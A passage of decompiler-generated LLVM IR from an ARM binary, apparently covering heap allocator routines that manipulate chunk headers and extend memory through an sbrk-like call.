  br i1 %tmp40, label %.thread6, label %dec_label_pc_12484

dec_label_pc_12484:                               ; preds = %dec_label_pc_1246c
  %v0_12484 = load i32, i32* @r5, align 4
  %v1_12484 = add i32 %v0_12484, 20
  %v2_12484 = inttoptr i32 %v1_12484 to i32*
  %v3_12484 = load i32, i32* %v2_12484, align 4
  store i32 %v3_12484, i32* %r3.global-to-local, align 4
  %v1_12488 = load i32, i32* %r1.global-to-local, align 4
  %v2_12488 = add i32 %v1_12488, 20
  %v3_12488 = inttoptr i32 %v2_12488 to i32*
  store i32 %v3_12484, i32* %v3_12488, align 4
  %v0_1248c = load i32, i32* @r5, align 4
  %v1_1248c = add i32 %v0_1248c, 24
  %v2_1248c = inttoptr i32 %v1_1248c to i32*
  %v3_1248c = load i32, i32* %v2_1248c, align 4
  store i32 %v3_1248c, i32* %r3.global-to-local, align 4
  %v1_12490 = load i32, i32* %r1.global-to-local, align 4
  %v2_12490 = add i32 %v1_12490, 24
  %v3_12490 = inttoptr i32 %v2_12490 to i32*
  store i32 %v3_1248c, i32* %v3_12490, align 4
  %v0_12494 = load i32, i32* @ip, align 4
  %v7_12494 = icmp eq i32 %v0_12494, 9
  br i1 %v7_12494, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_12484
  %v1_12498 = load i32, i32* @r5, align 4
  %v2_12498 = add i32 %v1_12498, 28
  %v3_12498 = inttoptr i32 %v2_12498 to i32*
  %v4_12498 = load i32, i32* %v3_12498, align 4
  store i32 %v4_12498, i32* %r3.global-to-local, align 4
  %v2_1249c = load i32, i32* %r1.global-to-local, align 4
  %v3_1249c = add i32 %v2_1249c, 28
  %v4_1249c = inttoptr i32 %v3_1249c to i32*
  store i32 %v4_12498, i32* %v4_1249c, align 4
  %v1_124a0 = load i32, i32* @r5, align 4
  %v2_124a0 = add i32 %v1_124a0, 32
  %v3_124a0 = inttoptr i32 %v2_124a0 to i32*
  %v4_124a0 = load i32, i32* %v3_124a0, align 4
  store i32 %v4_124a0, i32* %r3.global-to-local, align 4
  %v2_124a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_124a4 = add i32 %v2_124a4, 32
  %v4_124a4 = inttoptr i32 %v3_124a4 to i32*
  store i32 %v4_124a0, i32* %v4_124a4, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_12484, %dec_label_pc_1246c, %dec_label_pc_1244c, %dec_label_pc_12440, %bb32
  %v0_124a8 = load i32, i32* @r5, align 4
  store i32 %v0_124a8, i32* @r0, align 4
  %v0_124ac = call i32 @function_12898()
  store i32 %v0_124ac, i32* %r0.global-to-local, align 4
  %v0_124b0 = load i32, i32* @r7, align 4
  %v1_124b0 = add i32 %v0_124b0, 8
  store i32 %v1_124b0, i32* @r4, align 4
  br label %dec_label_pc_125ec

dec_label_pc_124b8:                               ; preds = %bb30, %.thread2, %dec_label_pc_123f8
  %v0_124cc = phi i32 [ %v3_12428, %.thread2 ], [ %v1_12340, %bb30 ], [ %v1_124b8.pre, %dec_label_pc_123f8 ]
  %v0_124b8 = load i32, i32* @sb, align 4
  %v2_124b8 = sub i32 %v0_124cc, %v0_124b8
  store i32 %v2_124b8, i32* %r1.global-to-local, align 4
  %v0_124c0 = load i32, i32* @sl, align 4
  %v1_124c0 = add i32 %v0_124c0, 4
  %v2_124c0 = inttoptr i32 %v1_124c0 to i32*
  %v3_124c0 = load i32, i32* %v2_124c0, align 4
  %tmp41 = icmp ugt i32 %v2_124b8, 15
  %v1_124e8 = urem i32 %v3_124c0, 2
  store i32 %v1_124e8, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_124e8, label %dec_label_pc_124c8

dec_label_pc_124c8:                               ; preds = %dec_label_pc_124b8
  %v2_124cc = or i32 %v1_124e8, %v0_124cc
  store i32 %v2_124cc, i32* %r3.global-to-local, align 4
  store i32 %v2_124cc, i32* %v2_124c0, align 4
  %v0_124d4 = load i32, i32* @sl, align 4
  %v1_124d4 = load i32, i32* %r0.global-to-local, align 4
  %v2_124d4 = add i32 %v1_124d4, %v0_124d4
  store i32 %v2_124d4, i32* %r2.global-to-local, align 4
  %v1_124d8 = add i32 %v2_124d4, 4
  %v2_124d8 = inttoptr i32 %v1_124d8 to i32*
  %v3_124d8 = load i32, i32* %v2_124d8, align 4
  %v1_124dc = or i32 %v3_124d8, 1
  store i32 %v1_124dc, i32* %r3.global-to-local, align 4
  store i32 %v1_124dc, i32* %v2_124d8, align 4
  br label %dec_label_pc_12518

dec_label_pc_124e8:                               ; preds = %dec_label_pc_124b8
  %v2_124ec = add i32 %v0_124c0, %v0_124b8
  store i32 %v2_124ec, i32* %r0.global-to-local, align 4
  %v2_124f0 = or i32 %v1_124e8, %v0_124b8
  store i32 %v2_124f0, i32* %r3.global-to-local, align 4
  %v1_124f4 = or i32 %v2_124b8, 1
  store i32 %v1_124f4, i32* %r2.global-to-local, align 4
  store i32 %v2_124f0, i32* %v2_124c0, align 4
  %v0_124fc = load i32, i32* %r2.global-to-local, align 4
  %v1_124fc = load i32, i32* %r0.global-to-local, align 4
  %v2_124fc = add i32 %v1_124fc, 4
  %v3_124fc = inttoptr i32 %v2_124fc to i32*
  store i32 %v0_124fc, i32* %v3_124fc, align 4
  %v0_12500 = load i32, i32* %r0.global-to-local, align 4
  %v1_12500 = load i32, i32* %r1.global-to-local, align 4
  %v2_12500 = add i32 %v1_12500, %v0_12500
  store i32 %v2_12500, i32* %r2.global-to-local, align 4
  %v1_12504 = add i32 %v2_12500, 4
  %v2_12504 = inttoptr i32 %v1_12504 to i32*
  %v3_12504 = load i32, i32* %v2_12504, align 4
  %v1_12508 = or i32 %v3_12504, 1
  store i32 %v1_12508, i32* %r3.global-to-local, align 4
  store i32 %v1_12508, i32* %v2_12504, align 4
  %v0_12510 = load i32, i32* %r0.global-to-local, align 4
  %v1_12510 = add i32 %v0_12510, 8
  store i32 %v1_12510, i32* @r0, align 4
  %v0_12514 = call i32 @function_12898()
  store i32 %v0_12514, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12518

dec_label_pc_12518:                               ; preds = %dec_label_pc_124c8, %dec_label_pc_124e8
  %v0_12518 = load i32, i32* @sl, align 4
  %v1_12518 = add i32 %v0_12518, 8
  store i32 %v1_12518, i32* @r4, align 4
  br label %dec_label_pc_125ec

dec_label_pc_12520:                               ; preds = %bb29
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_c4ec.386 to i32), i32 74392), i32* %r1.global-to-local, align 4
  %v4_12528 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_c4ec.386 to i32), i32 74424) to i32*), align 4
  store i32 %v4_12528, i32* @r8, align 4
  %v2_1252c = inttoptr i32 %v1_1233c to i32*
  %v3_1252c = load i32, i32* %v2_1252c, align 4
  store i32 %v3_1252c, i32* @r4, align 4
  %v1_12530 = add i32 %v4_12528, 860
  %v2_12530 = inttoptr i32 %v1_12530 to i32*
  %v3_12530 = load i32, i32* %v2_12530, align 4
  %v1_12534 = add i32 %v3_1252c, 4
  %v1_12538 = add i32 %v3_12530, -1
  store i32 %v1_12538, i32* %r2.global-to-local, align 4
  %v2_1253c = add i32 %v1_12534, %v1_12538
  %v1_12540 = load i32, i32* @sb, align 4
  %v2_12540 = add i32 %v2_1253c, %v1_12540
  store i32 %v2_12540, i32* %r3.global-to-local, align 4
  %v2_12544 = sub i32 0, %v3_12530
  %v3_12544 = and i32 %v2_12540, %v2_12544
  store i32 %v3_12544, i32* @r7, align 4
  %v2_12548 = sub i32 %v3_12544, %v3_1252c
  store i32 %v2_12548, i32* @fp, align 4
  %v9_1254c = icmp eq i32 %v1_12340, %v2_12548
  br i1 %v9_1254c, label %dec_label_pc_125c0, label %dec_label_pc_12554

dec_label_pc_12554:                               ; preds = %dec_label_pc_12520
  %v2_12554 = sub i32 %v1_1233c, %v3_1252c
  store i32 %v2_12554, i32* %r0.global-to-local, align 4
  %v2_12558 = add i32 %v3_1252c, %v1_12340
  store i32 %v2_12558, i32* %r1.global-to-local, align 4
  store i32 %v3_12544, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_12564 = call i32 @function_140e4(i32 %v2_12554, i32 %v2_12558, i32 %v3_12544, i32 1)
  store i32 %v4_12564, i32* %r0.global-to-local, align 4
  %v7_12568 = icmp eq i32 %v4_12564, -1
  br i1 %v7_12568, label %dec_label_pc_125b4, label %dec_label_pc_12570

dec_label_pc_12570:                               ; preds = %dec_label_pc_12554
  %v1_12570 = load i32, i32* @r4, align 4
  %v2_12570 = add i32 %v1_12570, %v4_12564
  store i32 %v2_12570, i32* %r0.global-to-local, align 4
  %v0_12574 = load i32, i32* @fp, align 4
  %v1_12574 = or i32 %v0_12574, 2
  store i32 %v1_12574, i32* %r3.global-to-local, align 4
  %v2_12578 = add i32 %v2_12570, 4
  %v3_12578 = inttoptr i32 %v2_12578 to i32*
  store i32 %v1_12574, i32* %v3_12578, align 4
  %v0_1257c = load i32, i32* @r8, align 4
  %v1_1257c = add i32 %v0_1257c, 868
  %v2_1257c = inttoptr i32 %v1_1257c to i32*
  %v3_1257c = load i32, i32* %v2_1257c, align 4
  store i32 %v3_1257c, i32* %r3.global-to-local, align 4
  %v1_12580 = add i32 %v0_1257c, 880
  %v2_12580 = inttoptr i32 %v1_12580 to i32*
  %v3_12580 = load i32, i32* %v2_12580, align 4
  store i32 %v3_12580, i32* %r2.global-to-local, align 4
  %v0_12584 = load i32, i32* @r6, align 4
  %v2_12584 = sub i32 %v3_1257c, %v0_12584
  store i32 %v2_12584, i32* %r3.global-to-local, align 4
  %v1_12588 = load i32, i32* @r7, align 4
  %v2_12588 = add i32 %v1_12588, %v2_12584
  store i32 %v2_12588, i32* %r1.global-to-local, align 4
  %v1_1258c = add i32 %v0_1257c, 872
  %v2_1258c = inttoptr i32 %v1_1258c to i32*
  %v3_1258c = load i32, i32* %v2_1258c, align 4
  store i32 %v3_1258c, i32* %r3.global-to-local, align 4
  %v1_12594 = add i32 %v0_1257c, 884
  %v2_12594 = inttoptr i32 %v1_12594 to i32*
  %v3_12594 = load i32, i32* %v2_12594, align 4
  store i32 %v3_12594, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_12588, %v3_12580
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_12570
  store i32 %v2_12588, i32* %v2_12580, align 4
  %v0_1259c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1259c.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_12570, %bb33
  %v1_1259c = phi i32 [ %v0_1257c, %dec_label_pc_12570 ], [ %v1_1259c.pre, %bb33 ]
  %v0_1259c = phi i32 [ %v2_12588, %dec_label_pc_12570 ], [ %v0_1259c.pre, %bb33 ]
  %v2_1259c = add i32 %v1_1259c, 868
  %v3_1259c = inttoptr i32 %v2_1259c to i32*
  store i32 %v0_1259c, i32* %v3_1259c, align 4
  %v0_125a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_125a0 = load i32, i32* %r3.global-to-local, align 4
  %v2_125a0 = add i32 %v1_125a0, %v0_125a0
  store i32 %v2_125a0, i32* %r1.global-to-local, align 4
  %v1_125a4 = load i32, i32* %r2.global-to-local, align 4
  %v0_125a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_125a8 = add i32 %v0_125a8, 8
  store i32 %v1_125a8, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_125a0, %v1_125a4
  br i1 %tmp43, label %bb35, label %dec_label_pc_125ec

bb35:                                             ; preds = %bb34
  %v5_125ac = load i32, i32* @r8, align 4
  %v6_125ac = add i32 %v5_125ac, 884
  %v7_125ac = inttoptr i32 %v6_125ac to i32*
  store i32 %v2_125a0, i32* %v7_125ac, align 4
  br label %dec_label_pc_125ec

dec_label_pc_125b4:                               ; preds = %dec_label_pc_12554
  %v0_125b4 = load i32, i32* @sb, align 4
  %v1_125b4 = add i32 %v0_125b4, 4
  store i32 %v1_125b4, i32* %r3.global-to-local, align 4
  %v0_125b8 = load i32, i32* @r6, align 4
  %v3_125b8 = icmp ult i32 %v0_125b8, %v1_125b4
  br i1 %v3_125b8, label %dec_label_pc_125c8, label %dec_label_pc_125b4.dec_label_pc_125c0_crit_edge

dec_label_pc_125b4.dec_label_pc_125c0_crit_edge:  ; preds = %dec_label_pc_125b4
  %v0_125c0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_125c0

dec_label_pc_125c0:                               ; preds = %dec_label_pc_125b4.dec_label_pc_125c0_crit_edge, %dec_label_pc_12520
  %v0_125c0 = phi i32 [ %v0_125c0.pre, %dec_label_pc_125b4.dec_label_pc_125c0_crit_edge ], [ %v0_12328, %dec_label_pc_12520 ]
  store i32 %v0_125c0, i32* @r4, align 4
  br label %dec_label_pc_125ec

dec_label_pc_125c8:                               ; preds = %dec_label_pc_125b4
  %v1_125c8 = add i32 %v0_125b4, -7
  store i32 %v1_125c8, i32* @r0, align 4
  %v0_125cc = call i32 @function_1182c()
  store i32 %v0_125cc, i32* @r0, align 4
  store i32 %v0_125cc, i32* @r4, align 4
  %v2_125d0 = icmp eq i32 %v0_125cc, 0
  br i1 %v2_125d0, label %dec_label_pc_125ec, label %dec_label_pc_125d8

dec_label_pc_125d8:                               ; preds = %dec_label_pc_125c8
  %v0_125d8 = load i32, i32* @r6, align 4
  %v1_125d8 = add i32 %v0_125d8, -8
  store i32 %v1_125d8, i32* @r2, align 4
  %v0_125dc = load i32, i32* @r5, align 4
  store i32 %v0_125dc, i32* @r1, align 4
  %v0_125e0 = call i32 @function_11300()
  %v0_125e4 = load i32, i32* @r5, align 4
  store i32 %v0_125e4, i32* @r0, align 4
  %v0_125e8 = call i32 @function_12898()
  store i32 %v0_125e8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_125ec

dec_label_pc_125ec:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_125c8, %dec_label_pc_125c0, %dec_label_pc_12518, %.thread6, %dec_label_pc_12388, %dec_label_pc_125d8
  store i32 %v2_122dc, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_c4ec.386 to i32), i32 74392), i32* %r2.global-to-local, align 4
  %v4_125fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_c4ec.386 to i32), i32 74416) to i32*), align 4
  store i32 %v4_125fc, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_125fc)
  br label %dec_label_pc_12608

dec_label_pc_12608:                               ; preds = %dec_label_pc_122b8, %dec_label_pc_122a0, %dec_label_pc_12310, %dec_label_pc_125ec
  %v0_12608 = load i32, i32* @r4, align 4
  store i32 %v0_12608, i32* %r0.global-to-local, align 4
  store i32 %v3_12280, i32* @r4, align 4
  store i32 %v6_12280, i32* @r5, align 4
  store i32 %v9_12280, i32* @r6, align 4
  store i32 %v12_12280, i32* @r7, align 4
  store i32 %v15_12280, i32* @r8, align 4
  store i32 %v18_12280, i32* @sb, align 4
  store i32 %v21_12280, i32* @sl, align 4
  store i32 %v24_12280, i32* @fp, align 4
  store i32 %v27_12280, i32* @lr, align 4
  ret i32 %v0_12608

; uselistorder directives
  uselistorder i32 %v2_125a0, { 1, 0, 2 }
  uselistorder i32 %v2_12588, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12564, { 1, 0, 2 }
  uselistorder i32 %v3_12544, { 1, 0, 2, 3 }
  uselistorder i32 %v1_124e8, { 2, 1, 0 }
  uselistorder i32 %v2_124b8, { 1, 0, 2 }
  uselistorder i32 %v0_1244c, { 1, 0 }
  uselistorder i32 %v0_12408, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_1236c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_12364, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_12348, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_12340, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_1233c, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_1232c, { 1, 0 }
  uselistorder i32 %v0_12328, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_12308, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 13, 14, 15, 16, 17 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 12, 13, 14, 15, 9, 10 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 1, 7, 12, 8, 9, 10, 11, 26, 0, 20, 19, 25, 27, 21, 22, 23, 24, 13, 16, 15, 14, 17, 18 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_c4ec.386 to i32), i32 74424) to i32*), { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_c4ec.386 to i32), i32 74392), { 2, 3, 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_12608, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_125ec, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_12518, { 1, 0 }
  uselistorder label %dec_label_pc_124b8, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_12404, { 1, 2, 0 }
  uselistorder label %dec_label_pc_123f8, { 1, 0 }
  uselistorder label %dec_label_pc_123f4, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_1261c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1261c:
  %v0_1261c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1261c, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_1261c
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1261c, %bb
  %v10_12630 = phi i32 [ %arg1, %dec_label_pc_1261c ], [ 0, %bb ]
  ret i32 %v10_12630

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_12634(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12634:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_12634 = add i32 %arg2, 44
  %v2_12634 = inttoptr i32 %v1_12634 to i32*
  %v3_12634 = load i32, i32* %v2_12634, align 4
  %v1_1263c = add i32 %v3_12634, 4
  %v2_1263c = inttoptr i32 %v1_1263c to i32*
  %v3_1263c = load i32, i32* %v2_1263c, align 4
  %v1_12640 = add i32 %arg2, 860
  %v2_12640 = inttoptr i32 %v1_12640 to i32*
  %v3_12640 = load i32, i32* %v2_12640, align 4
  store i32 %v3_12640, i32* @r4, align 4
  %v1_12644 = and i32 %v3_1263c, -4
  store i32 %v1_12644, i32* @r6, align 4
  %v1_12648 = add i32 %v1_12644, -17
  %v2_1264c = add i32 %v1_12648, %v3_12640
  store i32 %arg2, i32* @r5, align 4
  %v2_12658 = sub i32 %v2_1264c, %arg1
  store i32 %v2_12658, i32* @r0, align 4
  store i32 %v3_12640, i32* @r1, align 4
  %v0_12660 = call i32 @function_10874()
  %v1_12664 = add i32 %v0_12660, -1
  store i32 %v1_12664, i32* %r0.global-to-local, align 4
  %v0_12668 = load i32, i32* @r4, align 4
  %v2_12668 = mul i32 %v0_12668, %v1_12664
  store i32 %v2_12668, i32* %r7.global-to-local, align 4
  %v2_1266c = icmp eq i32 %v2_12668, 0
  store i1 %v2_1266c, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_12668, 1
  br i1 %tmp8, label %dec_label_pc_126d4, label %dec_label_pc_12674

dec_label_pc_12674:                               ; preds = %dec_label_pc_12634
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12678 = call i32 @function_13da0(i32 0)
  store i32 %v1_12678, i32* %r0.global-to-local, align 4
  %v0_1267c = load i32, i32* @r5, align 4
  %v1_1267c = add i32 %v0_1267c, 44
  %v2_1267c = inttoptr i32 %v1_1267c to i32*
  %v3_1267c = load i32, i32* %v2_1267c, align 4
  %v0_12680 = load i32, i32* @r6, align 4
  %v2_12680 = add i32 %v0_12680, %v3_1267c
  %v9_12684 = icmp eq i32 %v1_12678, %v2_12680
  store i1 %v9_12684, i1* @cpsr_z, align 1
  store i32 %v1_12678, i32* @r4, align 4
  br i1 %v9_12684, label %dec_label_pc_12690, label %dec_label_pc_126d4

dec_label_pc_12690:                               ; preds = %dec_label_pc_12674
  %v0_12690 = load i32, i32* %r7.global-to-local, align 4
  %v1_12690 = sub i32 0, %v0_12690
  store i32 %v1_12690, i32* %r0.global-to-local, align 4
  %v1_12694 = call i32 @function_13da0(i32 %v1_12690)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1269c = call i32 @function_13da0(i32 0)
  store i32 %v1_1269c, i32* %r0.global-to-local, align 4
  %v7_126a0 = icmp eq i32 %v1_1269c, -1
  store i1 %v7_126a0, i1* @cpsr_z, align 1
  br i1 %v7_126a0, label %dec_label_pc_126d4, label %dec_label_pc_126a8

dec_label_pc_126a8:                               ; preds = %dec_label_pc_12690
  %v0_126a8 = load i32, i32* @r4, align 4
  %v2_126a8 = sub i32 %v0_126a8, %v1_1269c
  store i32 %v2_126a8, i32* %r0.global-to-local, align 4
  %v9_126a8 = icmp eq i32 %v0_126a8, %v1_1269c
  store i1 %v9_126a8, i1* @cpsr_z, align 1
  br i1 %v9_126a8, label %dec_label_pc_126d4, label %dec_label_pc_126b0

dec_label_pc_126b0:                               ; preds = %dec_label_pc_126a8
  %v0_126b0 = load i32, i32* @r5, align 4
  %v1_126b0 = add i32 %v0_126b0, 872
  %v2_126b0 = inttoptr i32 %v1_126b0 to i32*
  %v3_126b0 = load i32, i32* %v2_126b0, align 4
  %v1_126b4 = load i32, i32* @r6, align 4
  %v2_126b4 = sub i32 %v1_126b4, %v2_126a8
  store i32 %v2_126b4, i32* %r2.global-to-local, align 4
  %v1_126b8 = add i32 %v0_126b0, 44
  %v2_126b8 = inttoptr i32 %v1_126b8 to i32*
  %v3_126b8 = load i32, i32* %v2_126b8, align 4
  store i32 %v3_126b8, i32* %r1.global-to-local, align 4
  %v2_126bc = sub i32 %v3_126b0, %v2_126a8
  %v1_126c0 = or i32 %v2_126b4, 1
  store i32 %v1_126c0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_126bc, i32* %v2_126b0, align 4
  %v0_126cc = load i32, i32* %r2.global-to-local, align 4
  %v1_126cc = load i32, i32* %r1.global-to-local, align 4
  %v2_126cc = add i32 %v1_126cc, 4
  %v3_126cc = inttoptr i32 %v2_126cc to i32*
  store i32 %v0_126cc, i32* %v3_126cc, align 4
  %v1_126e0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_126d8

dec_label_pc_126d4:                               ; preds = %dec_label_pc_12674, %dec_label_pc_126a8, %dec_label_pc_12690, %dec_label_pc_12634
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_126d8

dec_label_pc_126d8:                               ; preds = %dec_label_pc_126b0, %dec_label_pc_126d4
  %v1_126e0 = phi i32 [ %v1_126e0.pre, %dec_label_pc_126b0 ], [ 0, %dec_label_pc_126d4 ]
  ret i32 %v1_126e0

; uselistorder directives
  uselistorder i1 %v7_126a0, { 1, 0 }
  uselistorder i32 %v1_1269c, { 2, 1, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @function_13da0, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_126d8, { 1, 0 }
  uselistorder label %dec_label_pc_126d4, { 1, 2, 0, 3 }
}

define i32 @function_126e4() local_unnamed_addr {
dec_label_pc_126e4:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_126e4 = load i32, i32* @r4, align 4
  store i32 %v3_126e4, i32* %stack_var_-36, align 4
  %v0_126e8 = load i32, i32* @r0, align 4
  %v1_126e8 = inttoptr i32 %v0_126e8 to i32*
  %v2_126e8 = load i32, i32* %v1_126e8, align 4
  store i32 %v2_126e8, i32* %r3.global-to-local, align 4
  %v2_126ec = icmp eq i32 %v2_126e8, 0
  store i32 %v0_126e8, i32* @r4, align 4
  br i1 %v2_126ec, label %dec_label_pc_12824.preheader, label %dec_label_pc_12700

dec_label_pc_12824.preheader:                     ; preds = %dec_label_pc_126e4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1282c25 = add i32 %v0_126e8, 52
  store i32 %v1_1282c25, i32* %r3.global-to-local, align 4
  %v2_1283426 = add i32 %v0_126e8, 60
  %v3_1283427 = inttoptr i32 %v2_1283426 to i32*
  store i32 %v1_1282c25, i32* %v3_1283427, align 4
  %v0_1283828 = load i32, i32* %r3.global-to-local, align 4
  %v2_1283829 = add i32 %v0_1283828, 12
  %v3_1283830 = inttoptr i32 %v2_1283829 to i32*
  store i32 %v0_1283828, i32* %v3_1283830, align 4
  br label %dec_label_pc_12824.dec_label_pc_12824_crit_edge

dec_label_pc_12700:                               ; preds = %dec_label_pc_126e4
  %v1_12700 = and i32 %v2_126e8, -3
  %v3_12704 = udiv i32 %v2_126e8, 8
  store i32 %v3_12704, i32* %r2.global-to-local, align 4
  store i32 %v1_12700, i32* %v1_126e8, align 4
  %v0_1270c = load i32, i32* @r0, align 4
  %v1_1270c = add i32 %v0_1270c, -4
  store i32 %v1_1270c, i32* %r3.global-to-local, align 4
  %v1_12710 = load i32, i32* %r2.global-to-local, align 4
  %v4_12710 = mul i32 %v1_12710, 4
  %v5_12710 = add i32 %v4_12710, %v1_1270c
  store i32 %v5_12710, i32* %sb.global-to-local, align 4
  %v1_12714 = add i32 %v0_1270c, 52
  store i32 %v1_12714, i32* %r7.global-to-local, align 4
  %v1_12718 = add i32 %v0_1270c, 4
  store i32 %v1_12718, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_12720

dec_label_pc_12720:                               ; preds = %dec_label_pc_1281c, %dec_label_pc_12700
  %v1_1281410 = phi i32 [ %v1_12814, %dec_label_pc_1281c ], [ %v5_12710, %dec_label_pc_12700 ]
  %v1_1272c = phi i32 [ %v1_1281c, %dec_label_pc_1281c ], [ %v1_12718, %dec_label_pc_12700 ]
  %v1_12720 = inttoptr i32 %v1_1272c to i32*
  %v2_12720 = load i32, i32* %v1_12720, align 4
  store i32 %v2_12720, i32* %r1.global-to-local, align 4
  %v2_12724 = icmp eq i32 %v2_12720, 0
  br i1 %v2_12724, label %dec_label_pc_12814, label %dec_label_pc_1272c

dec_label_pc_1272c:                               ; preds = %dec_label_pc_12720
  %v0_1272c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1272c, i32* %v1_12720, align 4
  %v0_12730.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12730

dec_label_pc_12730:                               ; preds = %dec_label_pc_12808, %dec_label_pc_1272c
  %v0_1274c = phi i32 [ %v0_12808, %dec_label_pc_12808 ], [ %v0_12730.pre, %dec_label_pc_1272c ]
  %v1_12730 = add i32 %v0_1274c, 4
  %v2_12730 = inttoptr i32 %v1_12730 to i32*
  %v3_12730 = load i32, i32* %v2_12730, align 4
  store i32 %v3_12730, i32* %r3.global-to-local, align 4
  %v1_12734 = and i32 %v3_12730, -2
  store i32 %v1_12734, i32* %lr.global-to-local, align 4
  %v2_12738 = add i32 %v1_12734, %v0_1274c
  store i32 %v2_12738, i32* @r0, align 4
  %v1_1273c = urem i32 %v3_12730, 2
  %v2_1273c = icmp eq i32 %v1_1273c, 0
  %v1_12740 = add i32 %v0_1274c, 8
  %v2_12740 = inttoptr i32 %v1_12740 to i32*
  %v3_12740 = load i32, i32* %v2_12740, align 4
  store i32 %v3_12740, i32* %sl.global-to-local, align 4
  %v1_12744 = add i32 %v2_12738, 4
  %v2_12744 = inttoptr i32 %v1_12744 to i32*
  %v3_12744 = load i32, i32* %v2_12744, align 4
  store i32 %v3_12744, i32* %r8.global-to-local, align 4
  br i1 %v2_1273c, label %dec_label_pc_1274c, label %dec_label_pc_12780

dec_label_pc_1274c:                               ; preds = %dec_label_pc_12730
